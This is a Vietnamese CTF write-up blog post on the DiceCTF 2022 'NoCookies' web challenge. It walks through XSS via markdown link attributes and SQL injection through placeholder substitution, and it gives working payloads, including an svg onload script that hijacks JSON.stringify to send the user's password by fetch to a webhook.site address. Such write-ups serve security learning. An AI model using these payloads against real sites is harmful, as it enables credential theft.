<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="NoCookies - DiceCTF2022" /><meta name="author" content="to^" /><meta property="og:locale" content="en" /><meta name="description" content="From DiceCTF2022" /><meta property="og:description" content="From DiceCTF2022" /><link rel="canonical" href="https://to016.github.io//posts/noCookies/" /><meta property="og:url" content="https://to016.github.io//posts/noCookies/" /><meta property="og:site_name" content="to^" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-04-08T13:07:00+07:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="NoCookies - DiceCTF2022" /><meta name="twitter:site" content="@nguyendt0" /><meta name="twitter:creator" content="@to^" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"to^"},"dateModified":"2022-05-09T22:58:26+07:00","datePublished":"2022-04-08T13:07:00+07:00","description":"From DiceCTF2022","headline":"NoCookies - DiceCTF2022","mainEntityOfPage":{"@type":"WebPage","@id":"https://to016.github.io//posts/noCookies/"},"url":"https://to016.github.io//posts/noCookies/"}</script><title>NoCookies - DiceCTF2022 | to^</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="to^"><meta name="application-name" content="to^"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" /assets/img/avatar.jpeg " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">to^</a></div><div class="site-subtitle font-italic">Student, CTFer, web warrior</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/to016" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/nguyendt0" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['todinhnguyen1610','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>NoCookies - DiceCTF2022</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1000 400'%3E%3C/svg%3E" data-src="/assets/img/no_cookies/dicectf_logo.jpg" class="preview-img bg" alt="DiceCTF logo" width="1000" height="400" data-proofer-ignore><h1 data-toc-skip>NoCookies - DiceCTF2022</h1><div class="post-meta text-muted"><div> By <em> <a href="https://twitter.com/nguyendt0">Tô Đỉnh Nguyên</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1649398020" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2022-04-08 </em> </span> <span> Updated <em class="timeago" data-ts="1652111906" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2022-05-09 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="639 words"> <em>3 min</em> read</span></div></div></div><div class="post-content"><h2 id="link-challenge"><span class="mr-2"><em>Link challenge</em></span><a href="#link-challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p><a href="https://instancer.mc.ax/no-cookies">https://instancer.mc.ax/no-cookies</a></p><p><a href="https://admin-bot.mc.ax/no-cookies">https://admin-bot.mc.ax/no-cookies</a></p><h2 id="source-code"><span class="mr-2"><em>Source code</em></span><a href="#source-code" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p><a href="https://github.com/to016/to016.github.io/raw/main/assets/img/no_cookies/no-cookies.zip">Download</a></p><h2 id="sơ-lược-về-trang-web"><span class="mr-2"><em>Sơ lược về trang web</em></span><a href="#sơ-lược-về-trang-web" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p><img data-src="/assets/img/no_cookies/overview.png" alt="overview" data-proofer-ignore> <em>overview</em></p><ul><li>Sẽ có 2 chức năng: Register -&gt; đăng kí account và create note -&gt; tạo note<li>Hoạt động không dựa trên cookie mà yêu cầu ta nhập lại username, password mỗi lần thực hiện một hành động nào đó.</ul><p>Ở phần Create Note thì ta có 2 tùy chọn là Markdown hoặc là Plain. <img data-src="/assets/img/no_cookies/md_pl.png" alt="Create note" data-proofer-ignore> <em>create note option</em></p><h2 id="phân-tích"><span class="mr-2"><em>Phân tích</em></span><a href="#phân-tích" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><h3 id="1-xss-qua-markdown-option"><span class="mr-2">1. XSS qua markdown option</span><a href="#1-xss-qua-markdown-option" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>Đọc qua source code thì thấy phần lớn các trang view.html, register.html đều thuộc dạng client side rendering <img data-src="/assets/img/no_cookies/md_handler.png" alt="markdown note handler" data-proofer-ignore> <em>markdown note hander</em></p><p>Điều đáng chú ý ở đoạn code này là nếu note nhập vào có dạng <code class="language-plaintext highlighter-rouge">[blabla](test)</code> thì sẽ return thẻ a: <code class="language-plaintext highlighter-rouge">&lt;a href = "test"&gt;blabla&lt;/a&gt;</code> Từ đây có thể dễ dàng khai thác XSS: ta dùng 2 thuộc tính autofocus và onfocus để trigger nó</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>&lt;a href ="test" autofocus onfocus= "alert`1"&gt;
</pre></table></code></div></div><p>Điều đáng buồn là khi tạo note: <code class="language-plaintext highlighter-rouge">(foo)[http://example.com" autofocus=autofocus onfocus="alert(password&amp;#x29;]</code> (ở đây escape <code class="language-plaintext highlighter-rouge">)</code> trở thành <code class="language-plaintext highlighter-rouge">&amp;#x29;</code> để cho regex không làm mất đi <code class="language-plaintext highlighter-rouge">)</code> ) Gửi note và ấn view xuất hiện pop-up <code class="language-plaintext highlighter-rouge">undefined</code> 😟</p><p>Quay lại source code thấy rằng <code class="language-plaintext highlighter-rouge">const password</code>, được định nghĩa trong một anonymous arrow function và đoạn code được thực thi bên ngoài nó (đến từ HTML event handler)</p><p>Nhìn lại source, để ý cách validate password:</p><div class="language-js highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="kd">const</span> <span class="nx">validate</span> <span class="o">=</span> <span class="p">(</span><span class="nx">text</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
<span class="k">return</span> <span class="sr">/^</span><span class="se">[^</span><span class="sr">$'</span><span class="se">]</span><span class="sr">+$/</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">text</span> <span class="p">??</span> <span class="dl">''</span><span class="p">);</span>
<span class="p">}</span>
</pre></table></code></div></div><p>Chỉ đơn giản là kiểm tra sao cho phải có tối thiểu 1 kí tự và không tồn tại <code class="language-plaintext highlighter-rouge">'</code> hoặc <code class="language-plaintext highlighter-rouge">$</code> Mình tìm được một thứ thú vụ về <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/RegExp/input">Regex</a>. Đại khái là: <code class="language-plaintext highlighter-rouge">RegExp.input</code> hoặc <code class="language-plaintext highlighter-rouge">RegExp.$_</code> sẽ trả về chuỗi match với regular expression.</p><p>Ví dụ:</p><div class="language-js highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="kd">var</span> <span class="nx">re</span> <span class="o">=</span> <span class="sr">/hi/g</span><span class="p">;</span>
<span class="nx">re</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="dl">'</span><span class="s1">hi there!</span><span class="dl">'</span><span class="p">);</span>
<span class="nb">RegExp</span><span class="p">.</span><span class="nx">input</span><span class="p">;</span> <span class="c1">// "hi there!"</span>
<span class="nx">re</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="dl">'</span><span class="s1">foo</span><span class="dl">'</span><span class="p">);</span> <span class="c1">// new test, non-matching</span>
<span class="nb">RegExp</span><span class="p">.</span><span class="nx">$_</span><span class="p">;</span> <span class="c1">// "hi there!"</span>
<span class="nx">re</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="dl">'</span><span class="s1">hi world!</span><span class="dl">'</span><span class="p">);</span> <span class="c1">// new test, matching</span>
<span class="nb">RegExp</span><span class="p">.</span><span class="nx">$_</span><span class="p">;</span> <span class="c1">// "hi world!"</span>
</pre></table></code></div></div><p>Nhưng tất cả những <code class="language-plaintext highlighter-rouge">.replace()</code> call từ markdown parsing đã làm thay đổi giá trị của nó (overiding the password) vì vậy không thể khai thác thông qua markdown note -&gt; chỉ còn lại con đường plain note.</p><h3 id="2-xss-qua-plain-option"><span class="mr-2">2. XSS qua plain option</span><a href="#2-xss-qua-plain-option" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p><img data-src="/assets/img/no_cookies/db_handler1.png" alt="database handler code1" data-proofer-ignore> <em>database handler code1</em></p><p><img data-src="/assets/img/no_cookies/db_handler2.png" alt="database handler code2" data-proofer-ignore> <em>database handler code2</em></p><p>Ta có thể thấy trước khi chèn vào DB, note bị replace <code class="language-plaintext highlighter-rouge">&lt;</code> và <code class="language-plaintext highlighter-rouge">&gt;</code> gây khó khăn cho việc khai thác.</p><p>Nhưng <code class="language-plaintext highlighter-rouge">prepare function</code> đã giải quyết vấn đề này, hàm này đơn giản chỉ là replace <strong>lần lượt</strong> <code class="language-plaintext highlighter-rouge">:id, :username, :note, :mode</code> thành các giá trị tương ứng với nó.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>{
id: "12345",
username: ":note",
note: ', :mode, 22, 0)-- ',
mode: '&lt;img src=x onerror="alert(RegExp.input)"&gt;',
}
</pre></table></code></div></div><p><img data-src="/assets/img/no_cookies/sqli.png" alt="sqli poc" data-proofer-ignore> <em>sqli poc</em></p><h2 id="khai-thác"><span class="mr-2"><em>Khai thác</em></span><a href="#khai-thác" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p><img data-src="/assets/img/no_cookies/response.png" alt="reponse" data-proofer-ignore> <em>response</em></p><p><img data-src="/assets/img/no_cookies/result.png" alt="result" data-proofer-ignore> <em>result</em></p><h2 id="overwrite-documentqueryselector-và-jsonstringify"><span class="mr-2"><em>Overwrite “document.querySelector” và “JSON.stringify”</em></span><a href="#overwrite-documentqueryselector-và-jsonstringify" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>ở phần này mình sẽ đề cập tới một cách khai thác khác.</p><p>Cách này thì vẫn vận dụng sqli như cách trước để chèn xss note vào db nhưng khác ở chỗ xss note sẽ là:</p><div class="language-html highlighter-rouge"><div class="code-header"> <span data-label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nt">&lt;svg&gt;&lt;svg</span><span class="err">/</span><span class="na">onload=</span><span class="s">"document.querySelector=function(){JSON.stringify=a=&gt;fetch(`https://webhook.site/1e6c4248-b312-498b-93c3-073ffc762693?`+a.password),arguments.callee.caller()}"</span><span class="nt">&gt;</span>
</pre></table></code></div></div><p>Code này thực hiện việc rewrite lại hàm <code class="language-plaintext highlighter-rouge">document.querySelector</code> và <code class="language-plaintext highlighter-rouge">JSON.stringify</code>, sau đó gọi <code class="language-plaintext highlighter-rouge">arguments.callee.caller()</code></p><p><img data-src="/assets/img/no_cookies/exp.png" alt="Exploit" data-proofer-ignore></p><ul><li>Line 59 thực hiện gán <code class="language-plaintext highlighter-rouge">innerHTML = Plain note</code> của ta đồng thời kích hoạt <code class="language-plaintext highlighter-rouge">onload</code> event của <code class="language-plaintext highlighter-rouge">svg</code> thực hiện việc ghi đè hàm <code class="language-plaintext highlighter-rouge">document.querySelector</code>.<li>Line 60 gọi tới <code class="language-plaintext highlighter-rouge">document.querySelector</code> (lúc này là hàm mà ta đã định nghĩa lại): thực hiện ghi đè hàm <code class="language-plaintext highlighter-rouge">JSON.stringify</code> và đồng thời gọi tới <code class="language-plaintext highlighter-rouge">arguments.callee.caller()</code>.<li>Có thể hiểu arguments.callee là chỉ hàm hiện tại đang thực thi -&gt; <code class="language-plaintext highlighter-rouge">document.querySelector</code> và <code class="language-plaintext highlighter-rouge">arguments.callee.caller()</code> là hàm gọi tới nó, chính là cái <code class="language-plaintext highlighter-rouge">async ()</code> bao trọn tất cả code. Hay nói cách khác mục đích của <code class="language-plaintext highlighter-rouge">arguments.callee.caller()</code> là để chạy lại đoạn code từ 24 – 62 một lần nữa. Lúc này <code class="language-plaintext highlighter-rouge">JSON.stringify</code> nhận vào một object bao gồm password sẽ thực hiện fetch tới web hook của ta và boom flag!</ul><blockquote class="prompt-info"><div><p>dice{curr3nt_st4t3_0f_j4v45cr1pt}</p></div></blockquote><h2 id="tham-khảo"><span class="mr-2"><em>Tham khảo</em></span><a href="#tham-khảo" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p><a href="https://blog.bawolff.net/2022/02/write-up-for-dicectf-2022-nocookies.html">https://blog.bawolff.net/2022/02/write-up-for-dicectf-2022-nocookies.html</a></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/websec/'>WebSec</a>, <a href='/categories/ctf/'>CTF</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/sqli/" class="post-tag no-text-decoration" >sqli</a> <a href="/tags/xss/" class="post-tag no-text-decoration" >xss</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=NoCookies - DiceCTF2022 - to^&amp;url=https://to016.github.io//posts/noCookies/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=NoCookies - DiceCTF2022 - to^&amp;u=https://to016.github.io//posts/noCookies/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https://to016.github.io//posts/noCookies/&amp;text=NoCookies - DiceCTF2022 - to^" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/PHPLFI2RCE/">Các kĩ thuật nâng cao trong khai thác lỗ hổng PHP LFI2RCE</a><li><a href="/posts/angstromctf2022/">AngstromCTF 2022</a><li><a href="/posts/SWandMITM/">Service worker và Man-in-the-Middle Attack</a><li><a href="/posts/noted/">Noted - picoCTF2022</a><li><a href="/posts/31linephp/">31 Line PHP - SPbCTF2021</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/xss/">xss</a> <a class="post-tag" href="/tags/rce/">rce</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/timing-attack/">timing attack</a> <a class="post-tag" href="/tags/xxe/">xxe</a> <a class="post-tag" href="/tags/cache-probing/">cache probing</a> <a class="post-tag" href="/tags/cookie-bomb/">cookie bomb</a> <a class="post-tag" href="/tags/csrf/">csrf</a> <a class="post-tag" href="/tags/lfi/">LFI</a> <a class="post-tag" href="/tags/lfi/">lfi</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/nahamconctf2022/"><div class="card-body"> <em class="timeago small" data-ts="1651342200" > 2022-05-01 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>NahamconCTF 2022</h3><div class="text-muted small"><p> Solution for some web challenges solved challenges EXtravagant Upload exp.xml and view it 1 2 3 &amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt; &amp;lt;!DOCTYPE foo [ &amp;lt;!ENTITY xxe SYSTEM &quot;/var/www/...</p></div></div></a></div><div class="card"> <a href="/posts/angstromctf2022/"><div class="card-body"> <em class="timeago small" data-ts="1651505100" > 2022-05-02 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>AngstromCTF 2022</h3><div class="text-muted small"><p> My solution for some web challenges in this competition The Flash Use DOM breakpoints in Chrome devtools, right click on p tag and chose Break on -&amp;gt; subtree modifications then step over to get...</p></div></div></a></div><div class="card"> <a href="/posts/noted/"><div class="card-body"> <em class="timeago small" data-ts="1649084880" > 2022-04-04 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Noted - picoCTF2022</h3><div class="text-muted small"><p> Sơ lược về challenge Trang gồm có hai chức năng Login và Register overview1 Tiếp đó ta thể tạo note và gửi link để report. overview2 Phân tích Sau khi thử thì mình nhận thấy có lỗi xss ở đây C...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/31linephp/" class="btn btn-outline-primary" prompt="Older"><p>31 Line PHP - SPbCTF2021</p></a> <a href="/posts/crewctf2022/" class="btn btn-outline-primary" prompt="Newer"><p>CrewCTF 2022</p></a></div><script type="text/javascript"> $(function () { const origin = "https://giscus.app"; const iframe = "iframe.giscus-frame"; const lightTheme = "light"; const darkTheme = "dark_dimmed"; let initTheme = lightTheme; if ($("html[data-mode=dark]").length > 0 || ($("html[data-mode]").length == 0 && window.matchMedia("(prefers-color-scheme: dark)").matches)) { initTheme = darkTheme; } let giscusAttributes = { "src": "https://giscus.app/client.js", "data-repo": "to016/to016.github.io", "data-repo-id": "R_kgDOHGuNaQ", "data-category": "Comments", "data-category-id": "DIC_kwDOHGuNac4CPNhc", "data-mapping": "pathname", "data-reactions-enabled": "1", "data-emit-metadata": "0", "data-theme": initTheme, "data-input-position": "bottom", "data-lang": "en", "crossorigin": "anonymous", "async": "" }; let giscusScript = document.createElement("script"); Object.entries(giscusAttributes).forEach(([key, value]) => giscusScript.setAttribute(key, value)); document.getElementById("tail-wrapper").appendChild(giscusScript); addEventListener("message", (event) => { if (event.source === window && event.data && event.data.direction === ModeToggle.ID) { /* global theme mode changed */ const mode = event.data.message; const theme = (mode === ModeToggle.DARK_MODE ? darkTheme : lightTheme); const message = { setConfig: { theme: theme } }; const giscus = document.querySelector(iframe).contentWindow; giscus.postMessage({ giscus: message }, origin); } }); }); </script></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/nguyendt0">Tô Đỉnh Nguyên</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/xss/">xss</a> <a class="post-tag" href="/tags/rce/">rce</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/timing-attack/">timing attack</a> <a class="post-tag" href="/tags/xxe/">xxe</a> <a class="post-tag" href="/tags/cache-probing/">cache probing</a> <a class="post-tag" href="/tags/cookie-bomb/">cookie bomb</a> <a class="post-tag" href="/tags/csrf/">csrf</a> <a class="post-tag" href="/tags/lfi/">LFI</a> <a class="post-tag" href="/tags/lfi/">lfi</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
